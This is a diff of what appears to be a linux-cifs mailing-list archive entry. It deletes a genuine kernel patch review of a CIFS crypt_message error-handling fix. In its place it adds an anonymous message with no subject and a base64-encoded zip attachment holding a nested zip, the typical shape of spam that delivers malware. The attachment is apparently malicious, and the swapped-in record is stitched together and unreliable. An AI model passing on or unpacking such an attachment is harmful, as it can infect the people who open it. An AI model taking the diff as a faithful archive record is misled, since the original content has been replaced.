@@ -1,74 +1,76 @@
-From: Pavel Shilovskiy <pshilov-0li6OtcxBFHby3iVrkZq2A@public.gmane.org>
-Subject: RE: [PATCH] CIFS: Fix some return values in case of error in
- 'crypt_message'
-Date: Mon, 12 Jun 2017 23:12:17 +0000
-Message-ID: <CY4PR21MB0135BF129DED3C5BC7799C47B6CD0@CY4PR21MB0135.namprd21.prod.outlook.com>
-References: <20170611071247.2038-1-christophe.jaillet@wanadoo.fr>
+From: <ujagu8185-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
+Subject: (unknown)
+Date: Tue, 13 Jun 2017 04:35:10 -0000
+Message-ID: <149732851051.29695.7415662314639407669@zaural.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: quoted-printable
-Cc: "linux-cifs-u79uwXL29TY76Z2rM5mHXA@public.gmane.org" <linux-cifs-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>,
-        "samba-technical-w/Ol4Ecudpl8XjKLYN78aQ@public.gmane.org" <samba-technical-w/Ol4Ecudpl8XjKLYN78aQ@public.gmane.org>,
-        "linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org" <linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>,
-        "kernel-janitors-u79uwXL29TY76Z2rM5mHXA@public.gmane.org" <kernel-janitors-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
-To: Christophe JAILLET <christophe.jaillet-39ZsbGIQGT5GWvitb5QawA@public.gmane.org>,
-        "sfrench-eUNUBHrolfbYtjvyW6yDsg@public.gmane.org" <sfrench-eUNUBHrolfbYtjvyW6yDsg@public.gmane.org>
+Content-Type: application/zip; name="51151522.zip"
+Content-Transfer-Encoding: base64
+To: <linux-cifs-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
 Return-path: <linux-cifs-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
-In-Reply-To: <20170611071247.2038-1-christophe.jaillet-39ZsbGIQGT5GWvitb5QawA@public.gmane.org>
-Content-Language: en-US
+Subject: 
+Content-Disposition: attachment
 Sender: linux-cifs-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
 List-ID: <linux-cifs.vger.kernel.org>
 
-2017-06-11 0:12 GMT-07:00 Christophe JAILLET <christophe.jaillet-39ZsbGIQGT5GWvitb5QawA@public.gmane.org=
->:
-> 'rc' is known to be 0 at this point. So if 'init_sg' or 'kzalloc' fails, =
-we
-> should return -ENOMEM instead.
->
-> Also remove a useless 'rc' in a debug message as it is meaningless here.
->
-> Fixes: 026e93dc0a3ee ("CIFS: Encrypt SMB3 requests before sending")
-> Signed-off-by: Christophe JAILLET <christophe.jaillet-39ZsbGIQGT5GWvitb5QawA@public.gmane.org>
-> ---
->  fs/cifs/smb2ops.c | 4 +++-
->  1 file changed, 3 insertions(+), 1 deletion(-)
->
-> diff --git a/fs/cifs/smb2ops.c b/fs/cifs/smb2ops.c
-> index c58691834eb2..cdcb3d95add8 100644
-> --- a/fs/cifs/smb2ops.c
-> +++ b/fs/cifs/smb2ops.c
-> @@ -1809,7 +1809,8 @@ crypt_message(struct TCP_Server_Info *server, struc=
-t smb_rqst *rqst, int enc)
->
->         sg =3D init_sg(rqst, sign);
->         if (!sg) {
-> -               cifs_dbg(VFS, "%s: Failed to init sg %d", __func__, rc);
-> +               cifs_dbg(VFS, "%s: Failed to init sg", __func__);
-> +               rc =3D -ENOMEM;
->                 goto free_req;
->         }
->
-> @@ -1817,6 +1818,7 @@ crypt_message(struct TCP_Server_Info *server, struc=
-t smb_rqst *rqst, int enc)
->         iv =3D kzalloc(iv_len, GFP_KERNEL);
->         if (!iv) {
->                 cifs_dbg(VFS, "%s: Failed to alloc IV", __func__);
-> +               rc =3D -ENOMEM;
->                 goto free_sg;
->         }
->         iv[0] =3D 3;
-> --
-> 2.11.0
->
-> --
-> To unsubscribe from this list: send the line "unsubscribe linux-cifs" in
-> the body of a message to majordomo-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-> More majordomo info at  http://vger.kernel.org/majordomo-info.html
-
-Thanks for catching this.
-
-Reviewed-by: Pavel Shilovsky <pshilov-0li6OtcxBFHby3iVrkZq2A@public.gmane.org>
-
---
-Best regards,
-Pavel Shilovsky
+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
+AQABAE8AAAA+DQAAAAA=
